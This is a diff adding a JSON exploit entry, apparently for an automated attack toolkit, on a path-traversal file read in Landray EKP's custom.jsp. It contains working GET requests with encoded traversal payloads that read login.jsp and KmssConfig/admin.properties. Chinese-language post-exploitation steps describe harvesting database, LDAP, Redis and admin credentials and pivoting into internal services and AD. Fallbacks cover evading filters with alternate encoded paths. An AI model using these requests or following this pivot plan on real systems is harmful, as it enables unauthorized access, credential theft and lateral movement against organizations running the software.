@@ -1,0 +1,107 @@
+{
+  "id": "landray-ekp-custom-jsp-file-read",
+  "family": "oa",
+  "product": "Landray EKP",
+  "cve": "N/A",
+  "aliases": [
+    "蓝凌 EKP custom.jsp",
+    "Landray custom.jsp file read"
+  ],
+  "severity": "high",
+  "tags": [
+    "oa",
+    "landray",
+    "ekp",
+    "file-read",
+    "config-leak"
+  ],
+  "applicability": {
+    "versions": [
+      "EKP 15.x",
+      "EKP 16.x"
+    ],
+    "fingerprints": [
+      "Login pages, JS bundles, or static assets mention EKP / 蓝凌",
+      "Target exposes /sys/ui/extend/varkind/custom.jsp",
+      "Java-based OA deployment keeps KmssConfig or WEB-INF data under the application root"
+    ],
+    "signals": [
+      "custom.jsp reflects file content, page fragments, or template errors when given attacker-controlled file targets",
+      "Readable configuration files expose JDBC, LDAP, Redis, or admin account material",
+      "The endpoint is reachable without strong authentication"
+    ]
+  },
+  "preconditions": [
+    "The target is a Landray EKP deployment with the custom.jsp endpoint exposed.",
+    "The endpoint accepts attacker-controlled file or template parameters.",
+    "Readable files of interest exist under WEB-INF, KmssConfig, or adjacent application directories."
+  ],
+  "verification": {
+    "method": "http_get",
+    "requests": [
+      {
+        "path": "/sys/ui/extend/varkind/custom.jsp?var=%7B%22body%22%3A%7B%22file%22%3A%22..%2F..%2Flogin.jsp%22%7D%7D",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0",
+          "Accept": "*/*"
+        },
+        "data": "",
+        "matchers": [
+          "Returned content includes recognizable login.jsp fragments, title text, or JSP markers",
+          "Response clearly differs from a normal login page fetch"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "file_read",
+    "requests": [
+      {
+        "path": "/sys/ui/extend/varkind/custom.jsp?var=%7B%22body%22%3A%7B%22file%22%3A%22..%2F..%2FWEB-INF%2Fclasses%2FKmssConfig%2Fadmin.properties%22%7D%7D",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "",
+        "os_hint": "unknown"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "先从配置文件中提取数据库、LDAP、Redis、邮件和管理员相关凭据，再决定下一步横向路径。",
+      "如果拿到的是哈希、token 密钥或 JDBC 账户，优先尝试后台复用、数据库登录或单点登录链，而不是继续盲读文件。",
+      "对多层网络题，配置泄露通常是进入内网、邮件系统、文件共享或 AD 的关键跳板。"
+    ],
+    "shell_options": [
+      {
+        "type": "config_harvest",
+        "template": "Read WEB-INF, KmssConfig, and datasource-related files, then pivot with harvested credentials"
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "先读 harmless page file，例如 login.jsp，证明读取链路存在。",
+      "再读取配置与凭据文件，优先找可复用账号、连接串和密钥。",
+      "一旦获得高价值凭据，就转向后台登录、数据库或内网服务，不要停留在文件读取接口上反复试错。"
+    ],
+    "safe_commands": [],
+    "shell_prerequisites": [
+      "No shell is needed initially; success depends on readable configuration or template files being present."
+    ],
+    "fallbacks": [
+      "If the direct file-read path is filtered, try alternate relative paths, encoded traversal forms, or adjacent template endpoints in the same EKP deployment.",
+      "If config files are unavailable, pivot to attachment, workflow, or upload surfaces within the same OA."
+    ]
+  },
+  "detection_notes": [
+    "This entry is valuable in multi-step OA environments because file-read often yields the credentials that unlock later-stage lateral movement.",
+    "Even without direct RCE, Landray configuration leakage can expose enough material to reach admin panels, databases, or other internal services."
+  ],
+  "references": [
+    "Public Landray EKP custom.jsp analyses",
+    "Common EKP attack-chain notes for configuration leakage and credential recovery"
+  ]
+}
